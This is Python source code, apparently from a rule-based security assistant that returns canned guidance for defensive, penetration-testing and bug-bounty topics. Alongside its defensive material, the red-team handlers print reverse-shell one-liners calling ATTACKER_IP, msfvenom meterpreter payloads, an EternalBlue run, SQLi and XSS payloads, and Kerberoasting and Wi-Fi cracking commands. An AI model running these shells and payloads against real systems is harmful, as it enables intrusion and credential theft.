            f"```\n\n"
            f"### Phishing Header Analysis\n"
            f"```\n"
            f"Check these headers for spoofing:\n"
            f"- Return-Path vs From (mismatch = suspicious)\n"
            f"- Received headers (trace the actual origin)\n"
            f"- Authentication-Results (SPF/DKIM/DMARC pass/fail)\n"
            f"- X-Originating-IP\n"
            f"- Reply-To vs From (mismatch = likely phishing)\n"
            f"```\n\n"
            f"Need help analyzing a suspicious email?"
        )

    def _handle_threat_intel(self, msg, original):
        kb = self.knowledge_base["blue_team"]["threat_intelligence"]
        feeds = ", ".join(kb["feeds"])
        frameworks = ", ".join(kb["frameworks"])
        return (
            f"## Threat Intelligence\n\n"
            f"### Intelligence Feeds & Platforms\n{feeds}\n\n"
            f"### Frameworks\n{frameworks}\n\n"
            f"### IOC Lookup Commands\n"
            f"```bash\n"
            f"# VirusTotal API lookup\n"
            f"curl -s 'https://www.virustotal.com/api/v3/ip-addresses/SUSPECT_IP' \\\n"
            f"  -H 'x-apikey: YOUR_API_KEY' | jq '.data.attributes.last_analysis_stats'\n\n"
            f"# AbuseIPDB check\n"
            f"curl -s 'https://api.abuseipdb.com/api/v2/check?ipAddress=SUSPECT_IP' \\\n"
            f"  -H 'Key: YOUR_KEY' | jq '.data'\n\n"
            f"# Hash lookup on MalwareBazaar\n"
            f"curl -s -X POST 'https://mb-api.abuse.ch/api/v1/' \\\n"
            f"  -d 'query=get_info&hash=SHA256_HASH'\n"
            f"```\n\n"
            f"### MITRE ATT&CK Mapping\n"
            f"Map observed adversary behavior to ATT&CK techniques to:\n"
            f"- Build detection rules for known TTPs\n"
            f"- Identify gaps in detection coverage\n"
            f"- Prioritize defensive investments\n\n"
            f"What threat are you analyzing?"
        )

    # ═══════════════════════════════════════════════════════════════════
    #  RED TEAM HANDLERS
    # ═══════════════════════════════════════════════════════════════════

    def _handle_methodology(self, msg, original):
        kb = self.knowledge_base["red_team"]["methodology"]
        phases = "\n".join(f"  {p}" for p in kb["phases"])
        standards = ", ".join(kb["standards"])
        return (
            f"## VAPT Methodology\n\n"
            f"### Phases\n{phases}\n\n"
            f"### Standards\n{standards}\n\n"
            f"### Testing Types\n"
            f"- **Black Box** — No prior knowledge\n"
            f"- **Grey Box** — Partial knowledge (credentials, docs)\n"
            f"- **White Box** — Full access to source, architecture\n\n"
            f"### Rules of Engagement Checklist\n"
            f"- [ ] Written authorization / signed agreement\n"
            f"- [ ] Scope clearly defined (IPs, domains, apps)\n"
            f"- [ ] Out-of-scope items documented\n"
            f"- [ ] Emergency contacts established\n"
            f"- [ ] Testing window agreed upon\n"
            f"- [ ] Data handling and cleanup procedures\n\n"
            f"⚠️ **Always ensure proper authorization before testing.**\n\n"
            f"Which phase do you need guidance on?"
        )

    def _handle_recon(self, msg, original):
        kb = self.knowledge_base["red_team"]["reconnaissance"]
        if any(w in msg for w in ["passive", "osint"]):
            tools = ", ".join(kb["passive"]["tools"])
            techniques = "\n".join(f"- {t}" for t in kb["passive"]["techniques"])
            return (
                f"## Passive Reconnaissance\n\n"
                f"### Techniques\n{techniques}\n\n"
                f"### Commands\n"
                f"```bash\n"
                f"whois target.com\n"
                f"dig target.com ANY +noall +answer\n"
                f"curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq '.[].name_value' | sort -u\n"
                f"theHarvester -d target.com -b all -l 200\n"
                f"```\n\n"
                f"### Tools\n{tools}"
            )

        tools = ", ".join(kb["active"]["tools"])
        techniques = "\n".join(f"- {t}" for t in kb["active"]["techniques"])
        return (
            f"## Active Reconnaissance\n\n"
            f"### Techniques\n{techniques}\n\n"
            f"### Commands\n"
            f"```bash\n"
            f"nmap -sC -sV -p- -oA full_scan target.com\n"
            f"gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt\n"
            f"ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404\n"
            f"nikto -h http://target.com\n"
            f"```\n\n"
            f"### Tools\n{tools}\n\n"
            f"⚠️ Only scan systems you're authorized to test."
        )

    def _handle_web_security(self, msg, original):
        kb = self.knowledge_base["red_team"]["web_security"]

        if any(w in msg for w in ["sql injection", "sqli", "sqlmap"]):
            return (
                "## SQL Injection\n\n"
                "### Types\n"
                "- **In-band** — Union-based, Error-based\n"
                "- **Blind** — Boolean-based, Time-based\n"
                "- **Out-of-band** — DNS/HTTP exfiltration\n\n"
                "### Payloads\n"
                "```sql\n"
                "' OR '1'='1'--\n"
                "' UNION SELECT NULL,NULL,NULL--\n"
                "' AND SLEEP(5)--\n"
                "```\n\n"
                "### sqlmap\n"
                "```bash\n"
                "sqlmap -u 'http://target.com/page?id=1' --batch --dbs\n"
                "sqlmap -u 'http://target.com/page?id=1' -D db --tables --dump --batch\n"
                "```\n\n"
                "### Remediation\n"
                "- Parameterized queries / prepared statements\n"
                "- Input validation and WAF rules\n"
                "- Least privilege DB accounts"
            )

        if any(w in msg for w in ["xss", "cross-site scripting"]):
            return (
                "## Cross-Site Scripting (XSS)\n\n"
                "### Types\n"
                "- **Reflected** — Payload in URL\n- **Stored** — Persisted server-side\n- **DOM-based** — Client-side\n\n"
                "### Payloads\n"
                "```html\n"
                "<script>alert(document.domain)</script>\n"
                "<img src=x onerror=alert('XSS')>\n"
                "<svg onload=alert('XSS')>\n"
                "\"><script>alert(1)</script>\n"
                "```\n\n"
                "### Remediation\n"
                "- Output encoding\n- Content Security Policy (CSP)\n- HttpOnly/Secure cookie flags"
            )

        owasp = "\n".join(f"- **{k}**: {v}" for k, v in kb["owasp_top_10"].items())
        tools = ", ".join(kb["tools"])
        return (
            f"## Web Application Security\n\n"
            f"### OWASP Top 10\n{owasp}\n\n"
            f"### Tools\n{tools}\n\n"
            f"Which vulnerability type do you want to test?"
        )

    def _handle_network_attacks(self, msg, original):
        kb = self.knowledge_base["red_team"]["network_attacks"]
        attacks = "\n".join(f"- {a}" for a in kb["attacks"])
        tools = ", ".join(kb["tools"])

        if any(w in msg for w in ["port scan", "nmap"]):
            return (
                "## Port Scanning with Nmap\n\n"
                "```bash\n"
                "nmap -sS -p- target.com                    # SYN scan all ports\n"
                "nmap -sC -sV -p- -oA full target.com       # Version + scripts\n"
                "nmap -sU --top-ports 50 target.com          # UDP scan\n"
                "nmap --script vuln target.com               # Vulnerability scripts\n"
                "nmap -sS -f -D RND:5 --source-port 53 target.com  # Evasion\n"
                "```\n\n"
                "⚠️ Only scan authorized targets."
            )

        return (
            f"## Network Penetration Testing\n\n"
            f"### Attack Vectors\n{attacks}\n\n"
            f"### Tools\n{tools}\n\n"
            f"```bash\n"
            f"nmap -sn 192.168.1.0/24        # Network discovery\n"
            f"responder -I eth0 -wrf          # LLMNR/NBT-NS poisoning\n"
            f"enum4linux -a target_ip          # SMB enumeration\n"
            f"crackmapexec smb target_ip --shares  # Share enumeration\n"
            f"```\n\n⚠️ All testing must be authorized."
        )

    def _handle_exploitation(self, msg, original):
        kb = self.knowledge_base["red_team"]["exploitation"]

        if any(w in msg for w in ["reverse shell", "revshell"]):
            return (
                "## Reverse Shell Cheatsheet\n\n"
                "```bash\n"
                "# Bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n\n"
                "# Python\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n"
                "# PowerShell\n$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()}\n\n"
                "# Netcat\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT>/tmp/f\n\n"
                "# Listener\nnc -lvnp PORT\n"
                "```\n\n⚠️ For authorized testing only. Replace ATTACKER_IP and PORT."
            )

        if any(w in msg for w in ["metasploit", "msfconsole", "msfvenom"]):
            return (
                "## Metasploit Framework\n\n"
                "```bash\n"
                "msfconsole\n"
                "search type:exploit platform:windows smb\n"
                "use exploit/windows/smb/ms17_010_eternalblue\n"
                "set RHOSTS target_ip && set LHOST attacker_ip && run\n"
                "```\n\n"
                "### msfvenom Payloads\n"
                "```bash\n"
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe\n"
                "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf\n"
                "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php\n"
                "```\n\n⚠️ For authorized testing only."
            )

        frameworks = "\n".join(f"- **{k}**: {v}" for k, v in kb["frameworks"].items())
        techniques = "\n".join(f"- {t}" for t in kb["techniques"])
        return (
            f"## Exploitation\n\n"
            f"### Frameworks\n{frameworks}\n\n"
            f"### Techniques\n{techniques}\n\n"
            f"⚠️ Always ensure proper authorization."
        )

    def _handle_privesc(self, msg, original):
        kb = self.knowledge_base["red_team"]["privilege_escalation"]

        if any(w in msg for w in ["linux", "suid", "sudo", "gtfobins", "linpeas", "cron", "kernel"]):
            techniques = "\n".join(f"- {t}" for t in kb["linux"]["techniques"])
            return (
                f"## Linux Privilege Escalation\n\n"
                f"### Techniques\n{techniques}\n\n"
                f"### Quick Enum\n"
                f"```bash\n"
                f"id && whoami\nuname -a\nsudo -l\n"
                f"find / -perm -4000 -type f 2>/dev/null\n"
                f"getcap -r / 2>/dev/null\n"
                f"cat /etc/crontab\n"
                f"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"
                f"```"
            )

        if any(w in msg for w in ["windows", "winpeas", "potato", "printspoofer", "dll", "service", "token"]):
            techniques = "\n".join(f"- {t}" for t in kb["windows"]["techniques"])
            return (
                f"## Windows Privilege Escalation\n\n"
                f"### Techniques\n{techniques}\n\n"
                f"### Quick Enum\n"
                f"```powershell\n"
                f"whoami /all\nsysteminfo\nwhoami /priv\n"
                f"wmic service get name,displayname,pathname,startmode | findstr /i \"auto\"\n"
                f"powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"\n"
                f"```"
            )

        return (
            "## Privilege Escalation\n\n"
            "Which OS? **Linux** (SUID, sudo, cron, kernel) or **Windows** (services, tokens, DLL)?\n\n"
            "Share `id` / `whoami /all` and I'll suggest escalation paths."
        )

    def _handle_active_directory(self, msg, original):
        kb = self.knowledge_base["red_team"]["active_directory"]
        attacks = "\n".join(f"- {a}" for a in kb["attacks"])
        tools = ", ".join(kb["tools"])

        if any(w in msg for w in ["kerberoast", "kerberos"]):
            return (
                "## Kerberoasting\n\n"
                "```bash\n"
                "# Impacket\nGetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request -outputfile hashes.txt\n\n"
                "# Rubeus\nRubeus.exe kerberoast /outfile:hashes.txt\n\n"
                "# Crack\nhashcat -m 13100 hashes.txt rockyou.txt\n"
                "```\n\n"
                "### Defense\n- Use 25+ char passwords for service accounts\n- Use gMSA\n- Monitor Event ID 4769"
            )

        return (
            f"## Active Directory Attacks\n\n"
            f"### Techniques\n{attacks}\n\n"
            f"### Tools\n{tools}\n\n"
            f"```bash\n"
            f"GetADUsers.py domain.local/user:pass -dc-ip DC_IP -all\n"
            f"crackmapexec smb DC_IP -u user -p pass --shares\n"
            f"bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c All\n"
            f"```\n\n⚠️ Authorized testing only."
        )

    def _handle_cloud_security(self, msg, original):
        if self._is_blue():
            kb = self.knowledge_base["blue_team"]["hardening"]
            items = "\n".join(f"- {h}" for h in kb["cloud"])
            return (
                f"## Cloud Security Hardening\n\n"
                f"### Best Practices\n{items}\n\n"
                f"### Audit Tools\n"
                f"- **AWS**: Prowler, ScoutSuite, AWS Config\n"
                f"- **Azure**: ScoutSuite, Azure Security Center, Checkov\n"
                f"- **GCP**: ScoutSuite, Forseti, gcloud CLI\n\n"
                f"Which cloud provider are you securing?"
            )

        kb = self.knowledge_base["red_team"]["cloud_security"]
        return (
            f"## Cloud Security Assessment\n\n"
            f"### AWS Attack Vectors\n" + "\n".join(f"- {a}" for a in kb["aws"]) + "\n\n"
            f"### Azure Attack Vectors\n" + "\n".join(f"- {a}" for a in kb["azure"]) + "\n\n"
            f"### GCP Attack Vectors\n" + "\n".join(f"- {a}" for a in kb["gcp"]) + "\n\n"
            f"Which cloud environment are you assessing?"
        )

    # ═══════════════════════════════════════════════════════════════════
    #  HUNTER HANDLERS
    # ═══════════════════════════════════════════════════════════════════

    def _handle_bug_bounty(self, msg, original):
        kb = self.knowledge_base["hunter"]["bug_bounty_methodology"]

        if any(w in msg for w in ["platform", "program", "where to start", "getting started"]):
            platforms = ", ".join(kb["platforms"])
            tips = "\n".join(f"- {t}" for t in kb["tips"])
            return (
                f"## Getting Started with Bug Bounty\n\n"
                f"### Platforms\n{platforms}\n\n"
                f"### Tips for Beginners\n{tips}\n\n"
                f"### Recommended Learning Path\n"
                f"1. Learn web fundamentals (HTTP, cookies, sessions, CORS)\n"
                f"2. Study OWASP Top 10 thoroughly\n"
                f"3. Practice on labs (PortSwigger Web Security Academy, Hack The Box)\n"
                f"4. Set up Burp Suite and learn proxy-based testing\n"
                f"5. Start with VDP (Vulnerability Disclosure Programs) — no bounty but good practice\n"
                f"6. Move to paid programs, focus on less popular ones\n"
                f"7. Build automation for recon and specialize in 2-3 vuln types\n\n"
                f"What's your current skill level?"
            )

        phases = "\n".join(f"  {p}" for p in kb["phases"])
        return (
            f"## Bug Bounty Methodology\n\n"
            f"### Phases\n{phases}\n\n"
            f"### High-Value Targets to Test\n"
            + "\n".join(f"- {t}" for t in self.knowledge_base["hunter"]["web_hunting"]["high_value_targets"])
            + "\n\n### Pro Tips\n"
            + "\n".join(f"- {t}" for t in kb["tips"])
            + "\n\nWhat program or target are you hunting on?"
        )

    def _handle_api_security(self, msg, original):
        kb = self.knowledge_base["hunter"]["api_security"]
        techniques = "\n".join(f"- {t}" for t in kb["techniques"])
        tools = ", ".join(kb["tools"])

        return (
            f"## API Security Testing\n\n"
            f"### Common Vulnerabilities\n{techniques}\n\n"
            f"### Testing Approach\n"
            f"```bash\n"
            f"# Discover API endpoints\n"
            f"katana -u https://target.com -jc -d 3 | grep -i 'api\\|v1\\|v2\\|graphql'\n\n"
            f"# Fuzz API parameters\n"
            f"ffuf -u 'https://target.com/api/v1/users/FUZZ' -w ids.txt -fc 404\n\n"
            f"# GraphQL introspection\n"
            f"curl -s -X POST https://target.com/graphql \\\n"
            f"  -H 'Content-Type: application/json' \\\n"
            f"  -d '{{\"query\": \"{{__schema{{types{{name,fields{{name}}}}}}}}\"}}'\n\n"
            f"# JWT manipulation\n"
            f"jwt_tool TOKEN -T    # Tamper mode\n"
            f"jwt_tool TOKEN -C -d wordlist.txt  # Crack secret\n"
            f"```\n\n"
            f"### Tools\n{tools}\n\n"
            f"What API are you testing?"
        )

    def _handle_mobile_security(self, msg, original):
        kb = self.knowledge_base["hunter"]["mobile_security"]

        if any(w in msg for w in ["android", "apk"]):
            techniques = "\n".join(f"- {t}" for t in kb["android"])
            return (
                f"## Android Security Testing\n\n"
                f"### Techniques\n{techniques}\n\n"
                f"### Quick Start\n"
                f"```bash\n"
                f"# Decompile APK\n"
                f"jadx -d output/ target.apk\n\n"
                f"# Search for secrets\n"
                f"grep -rn 'api_key\\|secret\\|password\\|token' output/\n\n"
                f"# SSL pinning bypass with Frida\n"
                f"frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause\n\n"
                f"# Dynamic analysis with objection\n"
                f"objection -g com.target.app explore\n"
                f"```\n\n"
                f"### Tools\n" + ", ".join(kb["tools"])
            )

        tools = ", ".join(kb["tools"])
        return (
            f"## Mobile Application Security\n\n"
            f"### Android Techniques\n" + "\n".join(f"- {t}" for t in kb["android"]) + "\n\n"
            f"### iOS Techniques\n" + "\n".join(f"- {t}" for t in kb["ios"]) + "\n\n"
            f"### Tools\n{tools}\n\n"
            f"Which platform are you testing?"
        )

    def _handle_report_writing(self, msg, original):
        kb = self.knowledge_base["hunter"]["report_writing"]
        structure = "\n".join(f"  {s}" for s in kb["structure"])
        tips = "\n".join(f"- {t}" for t in kb["tips"])

        return (
            f"## Vulnerability Report Writing\n\n"
            f"### Report Structure\n{structure}\n\n"
            f"### Example Report Template\n"
            f"```markdown\n"
            f"# IDOR in User Profile API\n\n"
            f"## Severity: High (CVSS 7.5)\n\n"
            f"## Description\n"
            f"The endpoint `GET /api/v1/users/{{id}}/profile` does not validate that\n"
            f"the authenticated user owns the requested profile. An attacker can\n"
            f"enumerate and access any user's personal data by modifying the `id` parameter.\n\n"
            f"## Steps to Reproduce\n"
            f"1. Log in as user A (id=1001)\n"
            f"2. Send: `GET /api/v1/users/1002/profile` with user A's auth token\n"
            f"3. Observe: user B's profile data is returned\n\n"
            f"## Impact\n"
            f"An attacker can access PII (name, email, address, phone) of all platform users.\n"
            f"Estimated ~50,000 users affected.\n\n"
            f"## Remediation\n"
            f"Implement server-side authorization check: validate that `request.user.id == id` parameter.\n"
            f"```\n\n"
            f"### Writing Tips\n{tips}\n\n"
            f"Need help writing a report for a specific bug?"
        )

    # ═══════════════════════════════════════════════════════════════════
    #  SHARED HANDLERS
    # ═══════════════════════════════════════════════════════════════════

    def _handle_tool_question(self, msg, original):
        if "nmap" in msg:
            return self._handle_network_attacks(msg, original)

        if any(w in msg for w in ["burp", "zap"]):
            return (
                "## Burp Suite Cheatsheet\n\n"
                "### Workflow\n"
                "1. Configure proxy (127.0.0.1:8080)\n"
                "2. Spider/Crawl the target\n"
                "3. Intercept and modify requests\n"
                "4. Use Repeater for manual testing\n"
                "5. Use Intruder for fuzzing\n\n"
                "### Key Extensions\n"
                "- **Autorize** — Authorization testing\n"
                "- **Logger++** — Advanced logging\n"
                "- **Param Miner** — Hidden parameter discovery\n"
                "- **JWT Editor** — Token manipulation\n"
                "- **Turbo Intruder** — High-speed fuzzing"
            )

        if any(w in msg for w in ["hashcat", "john", "crack"]):
            return (
                "## Password Cracking\n\n"
                "```bash\n"
                "# Hashcat modes: 0=MD5, 100=SHA1, 1000=NTLM, 13100=Kerberoast\n"
                "hashcat -m 1000 hashes.txt rockyou.txt\n"
                "hashcat -m 1000 hashes.txt wordlist.txt -r best64.rule\n\n"
                "# John the Ripper\n"
                "john --wordlist=rockyou.txt hashes.txt\n"
                "```"
            )

        return (
            "## Security Tools\n\n"
            "I can help with:\n"
            "**Recon:** Nmap, Masscan, Subfinder, Amass\n"
            "**Web:** Burp Suite, ZAP, sqlmap, ffuf, Nuclei\n"
            "**Exploitation:** Metasploit, Cobalt Strike, Sliver\n"
            "**AD:** BloodHound, Impacket, Rubeus, Mimikatz\n"
            "**Cracking:** Hashcat, John, Hydra\n"
            "**Defense:** Splunk, Wazuh, Velociraptor, YARA\n\n"
            "Which tool?"
        )

    def _handle_reverse_engineering(self, msg, original):
        kb = self.knowledge_base["shared"]["reverse_engineering"]
        tools = ", ".join(kb["tools"])
        techniques = "\n".join(f"- {t}" for t in kb["techniques"])
        return (
            f"## Reverse Engineering\n\n"
            f"### Techniques\n{techniques}\n\n"
            f"### Tools\n{tools}\n\n"
            f"### Ghidra Quick Start\n"
            f"1. Import binary → Auto-analyze\n"
            f"2. Navigate to main() / entry point\n"
            f"3. Decompiler window for pseudocode\n"
            f"4. Cross-reference strings and imports\n\n"
            f"### Safety: Use isolated VMs (FlareVM, REMnux)"
        )

    def _handle_forensics(self, msg, original):
        kb = self.knowledge_base["shared"]["forensics"]
        techniques = "\n".join(f"- {t}" for t in kb["techniques"])
        tools = ", ".join(kb["tools"])
        return (
            f"## Digital Forensics\n\n"
            f"### Techniques\n{techniques}\n\n"
            f"### Volatility 3 (Memory Forensics)\n"
            f"```bash\n"
            f"vol -f memory.dmp windows.pslist     # Process list\n"
            f"vol -f memory.dmp windows.psscan     # Hidden processes\n"
            f"vol -f memory.dmp windows.netscan    # Network connections\n"
            f"vol -f memory.dmp windows.cmdline    # Command history\n"
            f"```\n\n"
            f"### Tools\n{tools}"
        )

    def _handle_crypto(self, msg, original):
        kb = self.knowledge_base["shared"]["cryptography"]
        topics = "\n".join(f"- {t}" for t in kb["topics"])
        tools = ", ".join(kb["tools"])
        return (
            f"## Cryptography\n\n"
            f"### Attack Types\n{topics}\n\n"
            f"### Tools\n{tools}\n\n"
            f"```bash\n"
            f"hashid 'HASH_VALUE'          # Identify hash type\n"
            f"echo 'string' | base64 -d    # Base64 decode\n"
            f"jwt_tool TOKEN -T            # JWT tampering\n"
            f"```"
        )

    def _handle_compliance(self, msg, original):
        kb = self.knowledge_base["blue_team"]["compliance"]
        frameworks = "\n".join(f"- **{k}**: {v}" for k, v in kb["frameworks"].items())
        return (
            f"## Security Compliance & Frameworks\n\n"
            f"### Frameworks\n{frameworks}\n\n"
            f"### MITRE ATT&CK Tactics\n"
            f"Reconnaissance → Resource Development → Initial Access → Execution → "
            f"Persistence → Privilege Escalation → Defense Evasion → Credential Access → "
            f"Discovery → Lateral Movement → Collection → Exfiltration → Impact\n\n"
            f"Which framework do you need help with?"
        )

    def _handle_security_code(self, msg, original):
        if self._is_blue():
            return (
                "## Security Automation Scripts\n\n"
                "I can write defensive security tools:\n\n"
                "- 📊 **Log analyzer** — Parse and correlate security logs\n"
                "- 🔍 **IOC scanner** — Search for indicators across endpoints\n"
                "- 🛡️ **Hardening checker** — Audit system configurations\n"
                "- 📧 **Phishing analyzer** — Parse email headers for spoofing\n"
                "- 🤖 **SOAR playbook** — Automated incident response\n"
                "- 📋 **Compliance checker** — CIS benchmark validation\n\n"
                "What defensive tool would you like me to build?"
            )
        elif self._is_hunter():
            return (
                "## Bug Hunting Automation\n\n"
                "I can write hunting tools:\n\n"
                "- 🔍 **Recon pipeline** — Subdomain enum → live check → screenshot\n"
                "- 🌐 **Endpoint discoverer** — JS file analysis for hidden APIs\n"
                "- 🎯 **Parameter fuzzer** — Automated parameter discovery\n"
                "- 📝 **Report generator** — Template-based vulnerability reports\n"
                "- 🔌 **API tester** — BOLA/IDOR automated checker\n\n"
                "What tool do you need?"
            )
        else:
            return (
                "## Security Scripting\n\n"
                "I can write offensive security tools:\n\n"
                "- 🔌 **Port scanner** — Multi-threaded TCP scanner\n"
                "- 🔍 **Subdomain enumerator** — DNS brute-force + CT logs\n"
                "- 🌐 **Web vuln scanner** — Header analysis, directory brute\n"
                "- 🔓 **Hash cracker** — Dictionary-based hash cracking\n"
                "- 💣 **Reverse shell generator** — Multi-language payloads\n\n"
                "What tool do you need?"
            )

    def _handle_wireless(self, msg, original):
        return (
            "## Wireless Security\n\n"
            "### WPA2 Handshake Capture\n"
            "```bash\n"
            "airmon-ng start wlan0\n"
            "airodump-ng wlan0mon\n"
            "airodump-ng -c CH --bssid AP_MAC -w capture wlan0mon\n"
            "aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon\n"
            "aircrack-ng -w rockyou.txt capture-01.cap\n"
            "```\n\n⚠️ Only test networks you own or have authorization to assess."
        )

    def _handle_general(self, msg, original, history):
        if any(w in msg for w in ["thank", "thanks", "thx"]):
            return random.choice([
                "Happy to help! Stay secure. What's next?",
                "No problem! Ready for the next challenge.",
            ])

        if any(w in msg for w in ["bye", "goodbye", "see you"]):
            return "Stay secure! See you next session. 🔐"

        if msg in ["yes", "yeah", "yep", "sure", "ok", "okay"]:
            return "Roger. What's the next step?"

        if msg in ["no", "nope", "nah"]:
            return "Understood. Need help with a different topic?"

        name = self._display_name()
        if self._is_blue():
            return (
                f"I'm **{name}** — I can help with:\n\n"
                "- 🛡️ **SOC/SIEM** — Detection rules, alert triage, Splunk/Elastic queries\n"
                "- 🚨 **Incident Response** — Playbooks, containment, forensics\n"
                "- 🔍 **Threat Hunting** — Hypothesis-driven, MITRE ATT&CK based\n"
                "- 🔒 **Hardening** — OS, network, cloud, Active Directory\n"
                "- 📊 **Vulnerability Management** — Scanning, prioritization, patching\n"
                "- 📋 **Compliance** — NIST, ISO 27001, PCI-DSS, CIS\n\n"
                "What defensive security challenge are you working on?"
            )
        elif self._is_red():
            return (
                f"I'm **{name}** — I can help with:\n\n"
                "- 🔍 **Reconnaissance** — OSINT, subdomain enum, port scanning\n"
                "- 🌐 **Web Security** — OWASP Top 10, SQLi, XSS, SSRF\n"
                "- 🖧 **Network Attacks** — MITM, LLMNR, lateral movement\n"
                "- 🏛️ **Active Directory** — Kerberoasting, BloodHound, DCSync\n"
                "- ⬆️ **Privilege Escalation** — Linux & Windows\n"
                "- 💣 **Exploitation** — Metasploit, C2, payload crafting\n\n"
                "What security assessment are you running?"
            )
        else:
            return (
                f"I'm **{name}** — I can help with:\n\n"
                "- 🎯 **Bug Bounty** — Methodology, platform guidance\n"
                "- 🌐 **Web Hunting** — IDOR, XSS, SSRF, SQLi, auth bypass\n"
                "- 🔌 **API Security** — BOLA, GraphQL, JWT attacks\n"
                "- 📱 **Mobile Security** — Android/iOS testing\n"
                "- 🔍 **Recon** — Asset discovery, subdomain enum\n"
                "- 📝 **Report Writing** — PoC templates, impact maximization\n\n"
                "What are you hunting today?"
            )
